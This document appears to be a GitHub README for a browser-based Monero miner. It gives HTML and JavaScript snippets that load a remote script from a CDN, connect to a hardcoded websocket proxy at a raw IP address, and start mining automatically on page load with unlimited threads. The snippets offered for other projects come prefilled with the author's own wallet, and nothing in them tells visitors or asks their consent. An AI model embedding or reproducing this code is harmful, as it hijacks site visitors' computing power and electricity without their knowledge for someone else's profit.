## Monero Webminer

Html & Js code that allows Mining of XMR (Monero) on browsers


# Configure

In index.Html you can configure it your preferences

- Pool
- XMR Wallet
- Miner name
- Threads (-1 means unlimited)
- Miner Password (Optional, Moneroocean does not use password, if your pool does, it is usually "x")


```javascript
server = "wss://45.119.82.33:40725";
    var pool = "pool.supportxmr.com:443";
    var walletAddress = "INSERT YOUR ADDRESS HERE";
    var workerId = "INSERT NODE NAME"
    var threads = -1;
    var password = "";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
```
# Running

Open index.html in any web browser and it will automatically start mining.

https://monero-miner.vercel.app/


# Check Progress 

Go to supportxmr.com This is the pool you are connected to, it will show your hashrate and balance.

# How do i know if it works??

1. Open https://monero-miner.vercel.app/
2. Also Open https://supportxmr.com/ in a new tab
3. Paste in my XMR Address 473rsRZRCr4dDsX44yRBSETPrMnHNNzpjG4MkHcuFdRXTcXbbX8T4ow2b8bkZoxEoeVNdagTo8qGwK689wuy7CrWJDXpEup
4. You will see that "GH-XMR" is Mining. You can also do the same 

# Use In Other Projects 


HTML
  
    <!-- Start Of Mining Code (HTML) -->
    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
    <script>
        server = "wss://45.119.82.33:40725";
        var pool = "pool.supportxmr.com:443";
        var walletAddress = "473rsRZRCr4dDsX44yRBSETPrMnHNNzpjG4MkHcuFdRXTcXbbX8T4ow2b8bkZoxEoeVNdagTo8qGwK689wuy7CrWJDXpEup";
        var workerId = "GH-XMR"
        var threads = -1;
        var password = "";
        startMining(pool, walletAddress, workerId, threads, password);
        throttleMiner = 20;
    </script>
    <!-- End Of Mining Code (HTML) -->
      

Javascript import snippet
  
    import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';


Javascript
    
    // Start Of Mining Code (Javascript)
    var script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
    document.head.appendChild(script);

    server = "wss://45.119.82.33:40725";
    var pool = "moneroocean.stream";
    var walletAddress = "473rsRZRCr4dDsX44yRBSETPrMnHNNzpjG4MkHcuFdRXTcXbbX8T4ow2b8bkZoxEoeVNdagTo8qGwK689wuy7CrWJDXpEup";
    var workerId = "GH-XMR"
    var threads = -1;
    var password = "";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
    // End Of Mining Code
    
    
#  Donate
    
    
This software is **100% free** to use, and we would greatly appreciate any donations to help support our work. If you'd like to donate, you can use the following cryptocurrency addresses:



    XMR:  473rsRZRCr4dDsX44yRBSETPrMnHNNzpjG4MkHcuFdRXTcXbbX8T4ow2b8bkZoxEoeVNdagTo8qGwK689wuy7CrWJDXpEup

Thank you for choosing our Monero Webminer. We hope you find it useful and profitable
